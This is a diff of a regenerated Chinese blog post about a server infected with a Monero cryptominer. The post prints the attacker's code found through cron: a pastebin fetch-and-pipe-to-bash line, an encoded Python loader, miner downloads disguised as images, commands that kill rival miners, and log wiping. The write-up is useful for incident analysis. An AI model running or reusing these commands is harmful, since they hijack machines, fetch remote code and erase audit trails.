@@ -63,7 +63,7 @@
   "headline": "记一次被黑",
   "description" : "服务器被用来挖门罗币了。。。\n",
   "inLanguage" : "zh-cn",
-  "wordCount":  1604 ,
+  "wordCount":  1605 ,
   "datePublished" : "2018-10-15T00:00:00",
   "dateModified" : "2018-10-15T00:00:00",
   "image" : "https:\/\/liyiheng.github.io\/blog\/",
@@ -95,7 +95,7 @@
   <meta property="og:type" content="website" />
   <meta property="og:site_name" content="(≧▽≦)" />
 
-  <meta name="generator" content="Hugo 0.59.1" />
+  <meta name="generator" content="Hugo 0.66.0" />
   <link rel="alternate" href="https://liyiheng.github.io/blog/index.xml" type="application/rss+xml" title="(≧▽≦)">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
   <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
@@ -263,21 +263,17 @@
     <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
       <article role="main" class="blog-post">
         <p>服务器被用来挖门罗币了。。。</p>
-
 <h1 id="hacked-by-xmr-miner">Hacked by XMR miner</h1>
-
-<h2 id="起因-怪异的cron-table">起因：怪异的cron table</h2>
-
+<h2 id="起因怪异的cron-table">起因：怪异的cron table</h2>
 <p>通过cron table 发现URL：
 <code>https://pastebin.com/raw/1NtRkBc3</code></p>
-
 <p>查看其内容</p>
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">curl https://pastebin.com/raw/1NtRkBc3
-<span class="o">(</span>curl -fsSL https://pastebin.com/raw/tRxfvbYN <span class="o">||</span> wget -q -O- https://pastebin.com/raw/tRxfvbYN<span class="o">)</span><span class="p">|</span>base64 -d <span class="p">|</span>/bin/bash</code></pre></div>
-<h2 id="继续">继续</h2>
+<span class="o">(</span>curl -fsSL https://pastebin.com/raw/tRxfvbYN <span class="o">||</span> wget -q -O- https://pastebin.com/raw/tRxfvbYN<span class="o">)</span><span class="p">|</span>base64 -d <span class="p">|</span>/bin/bash
+</code></pre></div><h2 id="继续">继续</h2>
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">curl https://pastebin.com/raw/tRxfvbYN &gt;&gt; tRxfvbYN
-cat tRxfvbYN <span class="p">|</span> base64 --decode &gt;&gt; tRxfvbYN_decoded.sh</code></pre></div>
-<h2 id="核心脚本内容">核心脚本内容</h2>
+cat tRxfvbYN <span class="p">|</span> base64 --decode &gt;&gt; tRxfvbYN_decoded.sh
+</code></pre></div><h2 id="核心脚本内容">核心脚本内容</h2>
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh"><span class="cp">#!/bin/bash
 </span><span class="cp"></span><span class="nv">SHELL</span><span class="o">=</span>/bin/sh
 <span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@@ -391,9 +387,9 @@ rm -rf /tmp/kworkerds /bin/kworkerds /bin/config.json /var/tmp/kworkerds /var/tm
 rm -rf /tmp/.systemd-private-*
 chattr -i /usr/lib/libiacpkmn.so.3 <span class="o">&amp;&amp;</span> rm -rf /usr/lib/libiacpkmn.so.3
 chattr -i /etc/init.d/nfstruncate <span class="o">&amp;&amp;</span> rm -rf /etc/init.d/nfstruncate
-netstat -anp <span class="p">|</span> grep <span class="m">69</span>.28.55.86:443 <span class="p">|</span>awk <span class="s1">&#39;{print $7}&#39;</span><span class="p">|</span> awk -F<span class="s1">&#39;[/]&#39;</span> <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> xargs <span class="nb">kill</span> -9
-netstat -anp <span class="p">|</span> grep <span class="m">185</span>.71.65.238 <span class="p">|</span>awk <span class="s1">&#39;{print $7}&#39;</span><span class="p">|</span> awk -F<span class="s1">&#39;[/]&#39;</span> <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> xargs <span class="nb">kill</span> -9
-netstat -anp <span class="p">|</span> grep <span class="m">140</span>.82.52.87 <span class="p">|</span>awk <span class="s1">&#39;{print $7}&#39;</span><span class="p">|</span> awk -F<span class="s1">&#39;[/]&#39;</span> <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> xargs <span class="nb">kill</span> -9
+netstat -anp <span class="p">|</span> grep 69.28.55.86:443 <span class="p">|</span>awk <span class="s1">&#39;{print $7}&#39;</span><span class="p">|</span> awk -F<span class="s1">&#39;[/]&#39;</span> <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> xargs <span class="nb">kill</span> -9
+netstat -anp <span class="p">|</span> grep 185.71.65.238 <span class="p">|</span>awk <span class="s1">&#39;{print $7}&#39;</span><span class="p">|</span> awk -F<span class="s1">&#39;[/]&#39;</span> <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> xargs <span class="nb">kill</span> -9
+netstat -anp <span class="p">|</span> grep 140.82.52.87 <span class="p">|</span>awk <span class="s1">&#39;{print $7}&#39;</span><span class="p">|</span> awk -F<span class="s1">&#39;[/]&#39;</span> <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> xargs <span class="nb">kill</span> -9
 netstat -anp <span class="p">|</span> grep :3333 <span class="p">|</span>awk <span class="s1">&#39;{print $7}&#39;</span><span class="p">|</span> awk -F<span class="s1">&#39;[/]&#39;</span> <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> xargs <span class="nb">kill</span> -9
 netstat -anp <span class="p">|</span> grep :4444 <span class="p">|</span>awk <span class="s1">&#39;{print $7}&#39;</span><span class="p">|</span> awk -F<span class="s1">&#39;[/]&#39;</span> <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> xargs <span class="nb">kill</span> -9
 netstat -anp <span class="p">|</span> grep :5555 <span class="p">|</span>awk <span class="s1">&#39;{print $7}&#39;</span><span class="p">|</span> awk -F<span class="s1">&#39;[/]&#39;</span> <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> xargs <span class="nb">kill</span> -9
@@ -443,7 +439,7 @@ netstat -anp <span class="p">|</span> grep :13531 <span class="p">|</span>awk <s
 <span class="o">}</span>
 
 <span class="k">function</span> python<span class="o">()</span> <span class="o">{</span>
-	nohup python -c <span class="s2">&#34;import base64;exec(base64.b64decode(&#39;I2NvZGluZzogdXRmLTgKaW1wb3J0IHVybGxpYgppbXBvcnQgYmFzZTY0CgpkPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1ZWdDI3TGVIJwp0cnk6CiAgICBwYWdlPWJhc2U2NC5iNjRkZWNvZGUodXJsbGliLnVybG9wZW4oZCkucmVhZCgpKQogICAgZXhlYyhwYWdlKQpleGNlcHQ6CiAgICBwYXNz&#39;))&#34;</span> &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
+	nohup python -c <span class="s2">&#34;import base64;exec(base64.b64decode(&#39;I2NvZGluZzogdXRmLTgKaW1wb3J0IHVybGxpYgppbXBvcnQgYmFzZTY0CgpkPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1ZWdDI3TGVIJwp0cnk6CiAgICBwYWdlPWJhc2U2NC5iNjRkZWNvZGUodXJsbGliLnVybG9wZW4oZCkucmVhZCgpKQogICAgZXhlYyhwYWdlKQpleGNlcHQ6CiAgICBwYXNz&#39;))&#34;</span> &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
 	touch /tmp/.pythong
 <span class="o">}</span>
 
@@ -479,7 +475,7 @@ netstat -anp <span class="p">|</span> grep :13531 <span class="p">|</span>awk <s
 
 <span class="k">function</span> tables<span class="o">()</span> <span class="o">{</span>
 	iptables -I INPUT -p TCP --dport <span class="m">6379</span> -j REJECT
-	iptables -I INPUT -s <span class="m">127</span>.0.0.1 -p tcp --dport <span class="m">6379</span> -j ACCEPT
+	iptables -I INPUT -s 127.0.0.1 -p tcp --dport <span class="m">6379</span> -j ACCEPT
 	iptables-save
 	touch /tmp/.tables
 <span class="o">}</span>
@@ -512,9 +508,9 @@ netstat -anp <span class="p">|</span> grep :13531 <span class="p">|</span>awk <s
 			<span class="k">if</span> <span class="o">[</span> ! -f <span class="s2">&#34;/tmp/kworkerds&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
 				wget https://master.minerxmr.ru/y/1538099276x-1404792622.jpg -O /tmp/kworkerds <span class="o">&amp;&amp;</span> chmod +x /tmp/kworkerds
 			<span class="k">fi</span>
-				nohup /tmp/kworkerds &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
+				nohup /tmp/kworkerds &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
 		<span class="k">else</span>
-			nohup /tmp/kworkerds &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
+			nohup /tmp/kworkerds &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
 		<span class="k">fi</span>
 	<span class="k">fi</span>
 <span class="o">}</span>
@@ -536,21 +532,21 @@ netstat -anp <span class="p">|</span> grep :13531 <span class="p">|</span>awk <s
 			<span class="k">if</span> <span class="o">[</span> ! -f <span class="s2">&#34;/var/tmp/kworkerds&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
 				wget https://master.minerxmr.ru/y/1537410304x-1404764882.jpg -O /bin/kworkerds <span class="o">&amp;&amp;</span> chmod +x /var/tmp/kworkerds
 			<span class="k">fi</span>
-			nohup /var/tmp/kworkerds &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
+			nohup /var/tmp/kworkerds &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
 		<span class="k">elif</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$ARCH</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;i386&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
 			rm -rf /var/tmp/kworkerds*
 			curl -fsSL --connect-timeout <span class="m">120</span> https://master.minerxmr.ru/y/1537410750x-1566657908.jpg -o /var/tmp/kworkerds <span class="o">&amp;&amp;</span> chmod +x /var/tmp/kworkerds
 			<span class="k">if</span> <span class="o">[</span> ! -f <span class="s2">&#34;/var/tmp/kworkerds&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
 				wget https://master.minerxmr.ru/y/1537410750x-1566657908.jpg -O /bin/kworkerds <span class="o">&amp;&amp;</span> chmod +x /var/tmp/kworkerds
 			<span class="k">fi</span>
-			nohup /var/tmp/kworkerds &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
+			nohup /var/tmp/kworkerds &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
 		<span class="k">else</span>
 			rm -rf /var/tmp/kworkerds*
 			curl -fsSL --connect-timeout <span class="m">120</span> https://master.minerxmr.ru/y/1537410304x-1404764882.jpg -o /var/tmp/kworkerds <span class="o">&amp;&amp;</span> chmod +x /var/tmp/kworkerds
 			<span class="k">if</span> <span class="o">[</span> ! -f <span class="s2">&#34;/var/tmp/kworkerds&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
 				wget https://master.minerxmr.ru/y/1537410304x-1404764882.jpg -O /bin/kworkerds <span class="o">&amp;&amp;</span> chmod +x /var/tmp/kworkerds
 			<span class="k">fi</span>
-			nohup /var/tmp/kworkerds &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
+			nohup /var/tmp/kworkerds &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
 		<span class="k">fi</span>
 	<span class="k">fi</span>
 <span class="o">}</span>
@@ -581,18 +577,19 @@ chmod <span class="m">1777</span> /tmp
 	<span class="k">if</span> <span class="o">[</span> <span class="si">${</span><span class="nv">port</span><span class="si">}</span> -eq <span class="m">0</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
 		downloadrunxm
 	<span class="k">fi</span>
-	<span class="nb">echo</span> <span class="m">0</span>&gt;/var/spool/mail/root
-	<span class="nb">echo</span> <span class="m">0</span>&gt;/var/log/wtmp
-	<span class="nb">echo</span> <span class="m">0</span>&gt;/var/log/secure
-	<span class="nb">echo</span> <span class="m">0</span>&gt;/var/log/cron
+	<span class="nb">echo</span> 0&gt;/var/spool/mail/root
+	<span class="nb">echo</span> 0&gt;/var/log/wtmp
+	<span class="nb">echo</span> 0&gt;/var/log/secure
+	<span class="nb">echo</span> 0&gt;/var/log/cron
 <span class="k">fi</span>
-#</code></pre></div>
-<p>脚本中出现的挖矿程序的配置：</p>
+#
+</code></pre></div><p>脚本中出现的挖矿程序的配置：</p>
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh"><span class="k">if</span> <span class="o">[</span> ! -f <span class="s2">&#34;/var/tmp/config.json&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
         wget https://master.minerxmr.ru/y/1534496022x-1404764583.jpg -O /var/tmp/config.json <span class="o">&amp;&amp;</span> chmod +x /var/tmp/config.json
-<span class="k">fi</span></code></pre></div>
-<p>内容为：</p>
-<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">curl https://master.minerxmr.ru/y/1534496022x-1404764583.jpg</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+<span class="k">fi</span>
+</code></pre></div><p>内容为：</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">curl https://master.minerxmr.ru/y/1534496022x-1404764583.jpg
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
     <span class="nt">&#34;algo&#34;</span><span class="p">:</span> <span class="s2">&#34;cryptonight&#34;</span><span class="p">,</span>
     <span class="nt">&#34;api&#34;</span><span class="p">:</span> <span class="p">{</span>
         <span class="nt">&#34;port&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
@@ -629,7 +626,8 @@ chmod <span class="m">1777</span> /tmp
     <span class="nt">&#34;threads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
     <span class="nt">&#34;user-agent&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
     <span class="nt">&#34;watch&#34;</span><span class="p">:</span> <span class="kc">false</span>
-<span class="p">}</span></code></pre></div>
+<span class="p">}</span>
+</code></pre></div>
 
         
 
@@ -677,7 +675,7 @@ chmod <span class="m">1777</span> /tmp
 
           &nbsp;&bull;&nbsp;&copy;
           
-            2019
+            2020
           
 
           
@@ -687,7 +685,7 @@ chmod <span class="m">1777</span> /tmp
         </p>
         
         <p class="credits theme-by text-muted">
-          由 <a href="http://gohugo.io">Hugo v0.59.1</a> 强力驱动 &nbsp;&bull;&nbsp; 主题 <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> 移植自 <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          由 <a href="http://gohugo.io">Hugo v0.66.0</a> 强力驱动 &nbsp;&bull;&nbsp; 主题 <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> 移植自 <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
           
         </p>
       </div>
